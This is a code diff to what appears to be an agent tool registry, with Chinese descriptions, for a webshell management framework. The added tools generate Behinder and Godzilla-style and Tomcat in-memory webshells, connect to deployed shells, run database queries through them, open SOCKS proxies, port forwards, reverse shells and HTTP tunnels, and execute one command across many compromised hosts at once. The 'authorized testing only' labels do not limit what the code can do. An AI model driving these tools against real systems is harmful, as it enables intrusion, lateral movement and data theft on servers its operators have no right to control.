@@ -31,7 +31,7 @@ const str = (v) => (v === undefined || v === null ? "" : String(v));
 const TOOLS = [
 	{
 		name: "webshell_generate",
-		description: "生成基础/自研加密 webshell 源码（仅授权测试）。kind: php-oneliner/php-basic/php-aes1/php-aes2/jsp-basic/jsp-aes1/aspx-basic/aspx-aes1",
+		description: "生成 webshell 源码（仅授权测试）。kind: php-oneliner/php-basic/php-aes1/php-aes2/php-behinder/php-godzilla/jsp-basic/jsp-aes1/jsp-behinder/jsp-godzilla/jsp-mem-filter（Tomcat Filter 内存马引导器）/aspx-basic/aspx-aes1/aspx-behinder",
 		inputSchema: { type: "object", properties: { kind: { type: "string", enum: Object.keys(GEN_KINDS) }, name: { type: "string" }, password: { type: "string" }, pass_param: { type: "string" }, cmd_param: { type: "string" } }, required: ["kind"] },
 		run: (a) => {
 			const item = makeAndSave(BASE_DIR, str(a.kind), a);
@@ -41,7 +41,7 @@ const TOOLS = [
 	},
 	{
 		name: "webshell_connect",
-		description: "登记并连接 webshell（仅授权测试）：URL+口令(+盐)自动识别协议，探测 OS 与基本信息，返回连接 id",
+		description: "登记并连接 webshell（仅授权测试）：URL+口令(+盐)自动识别协议（含冰蝎 JSP/ASPX 编译载荷通道、哥斯拉 JSP 会话态通道与内存马 X-C 通道），探测 OS 与基本信息，返回连接 id。内存马 URL 填任意存活路径",
 		inputSchema: { type: "object", properties: { url: { type: "string" }, password: { type: "string" }, secret_key: { type: "string" }, name: { type: "string" }, pass_param: { type: "string" }, cmd_param: { type: "string" } }, required: ["url"] },
 		run: async (a) => {
 			const result = await detectProtocol({ url: a.url, password: str(a.password), secretKey: str(a.secret_key), passParam: str(a.pass_param) || "pass", cmdParam: str(a.cmd_param) || "cmd", timeoutMs: 8000 });
@@ -97,7 +97,7 @@ const TOOLS = [
 	},
 	{
 		name: "webshell_db",
-		description: "webshell 数据库操作（仅授权测试，需 eval 能力通道）：profile.save/dbs/tables/tableinfo/exec",
+		description: "webshell 数据库操作（仅授权测试）。PHP 系走 eval 通道（PDO）；behinder-java 通道走 JDBC（mysql/mssql/pgsql/oracle，目标应用自带驱动 jar）。action=profile.save/dbs/tables/tableinfo/exec",
 		inputSchema: { type: "object", properties: { conn_id: { type: "string" }, action: { type: "string", enum: ["profile.save", "dbs", "tables", "tableinfo", "exec"] }, profile_id: { type: "string" }, type: { type: "string" }, host: { type: "string" }, port: { type: "number" }, username: { type: "string" }, password: { type: "string" }, database: { type: "string" }, table: { type: "string" }, sql: { type: "string" } }, required: ["conn_id", "action"] },
 		run: async (a) => {
 			const conn = connOrThrow(a.conn_id);
@@ -110,6 +110,58 @@ const TOOLS = [
 			if (action === "tableinfo") return cap.dbTableInfo(conn, profile, str(a.database), str(a.table));
 			if (action === "exec") return cap.dbQuery(conn, profile, str(a.sql));
 			throw new Error(`未知操作 ${action}`);
+		}
+	},
+	{
+		name: "webshell_net",
+		description: "webshell 网络动作（behinder-java 载荷 / godzilla-java HTTP 隧道）：socks 目标侧 SOCKS5、fwd 端口转发、reverse 反弹 shell、tunnel.start/stop/status HTTP 隧道",
+		inputSchema: { type: "object", properties: { conn_id: { type: "string" }, kind: { type: "string", enum: ["socks", "fwd", "reverse", "tunnel.start", "tunnel.stop", "tunnel.status"] }, port: { type: "integer" }, listen: { type: "integer" }, host: { type: "string" }, any: { type: "boolean" } }, required: ["conn_id", "kind"] },
+		run: async (a) => {
+			const conn = getConn(store, str(a.conn_id));
+			if (!conn) throw new Error("连接不存在");
+			if (str(a.kind).startsWith("tunnel")) {
+				const { startTunnel, stopTunnel, tunnelStatus } = await import("../lib/protocol/tunnel.js");
+				if (a.kind === "tunnel.start") return await startTunnel(conn, Number(a.listen ?? a.port ?? 0));
+				if (a.kind === "tunnel.stop") return stopTunnel(Number(a.listen ?? a.port ?? 0));
+				return { tunnels: tunnelStatus() };
+			}
+			const { netAction } = await import("../lib/protocol/capabilities.js");
+			const out = await netAction(conn, str(a.kind), { port: a.port, listen: a.listen, host: str(a.host), any: a.any });
+			logOp(store, conn.id, "net." + str(a.kind), String(out).slice(0, 200));
+			return { output: out };
+		}
+	},
+	{
+		name: "webshell_batch_exec",
+		description: "多连接批量执行命令：对多个已登记 webshell 逐个执行同一命令并汇总结果",
+		inputSchema: { type: "object", properties: { conn_ids: { type: "array", items: { type: "string" } }, command: { type: "string" } }, required: ["conn_ids", "command"] },
+		run: async (a) => {
+			const { runCommand } = await import("../lib/protocol/capabilities.js");
+			const results = [];
+			for (const id of (a.conn_ids ?? []).map(str)) {
+				try {
+					const conn = getConn(store, id);
+					if (!conn) throw new Error("连接不存在");
+					const output = await runCommand(conn, str(a.command));
+					results.push({ id, name: conn.name, ok: true, output: String(output).slice(0, 2000) });
+				} catch (e) { results.push({ id, ok: false, error: String(e?.message ?? e) }); }
+			}
+			logOp(store, "batch", "conn.batch", str(a.command).slice(0, 100));
+			return { results };
+		}
+	},
+	{
+		name: "webshell_mem_unload",
+		description: "卸载内存马（仅授权测试；behinder-java 通道）：从 Tomcat StandardContext 移除动态 Filter 三注册面；name 留空自动读引导器登记；卸载后连接断开属预期",
+		inputSchema: { type: "object", properties: { conn_id: { type: "string" }, name: { type: "string" } }, required: ["conn_id"] },
+		run: async (a) => {
+			const { memUnload } = await import("../lib/protocol/capabilities.js");
+			const conn = getConn(store, str(a.conn_id));
+			if (!conn) throw new Error("连接不存在");
+			if (conn.protocol !== "behinder-java") throw new Error("内存马卸载需 behinder-java 通道");
+			const out = await memUnload(conn, str(a.name));
+			logOp(store, conn.id, "mem.unload", out);
+			return { output: out };
 		}
 	},
 	{
